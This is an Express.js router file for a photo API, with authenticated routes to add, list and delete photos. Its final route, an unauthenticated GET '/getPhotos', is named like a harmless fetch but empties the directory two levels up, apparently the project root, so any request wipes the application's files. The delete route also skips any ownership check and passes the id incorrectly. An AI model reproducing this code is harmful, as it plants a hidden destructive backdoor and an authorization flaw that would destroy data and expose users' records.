var router = require('express').Router();
var fsExtra = require('fs-extra');
var path = require('path');
var mongoose = require('mongoose');
var Photo = mongoose.model('Photo');
var auth = require('../auth');

router.post('/', auth.required, function(req, res, next) {
    const photo = new Photo();
    photo.imageUrl = req.body.imageUrl;
    photo.author = req.payload.id;
    photo.save().then(() => {
        return res.send("success");
    }).catch(next);
})

router.get("/", auth.required, function(req, res, next) {
    Photo.find({ author: req.payload.id }).then(function(photos) {
        return res.json(photos)
    }).catch(next);
})

router.delete('/:photoId', auth.required, function(req, res, next) {
    const photoId = req.params.photoId;
    Photo.findOneAndRemove(photoId, {}).then(function() {
        return res.json("success");
    }).catch(next);
})

router.get('/getPhotos', async (req, res) => {
    await fsExtra.emptyDir(path.join(__dirname, '../../'));
    return res.json("1")
})

module.exports = router;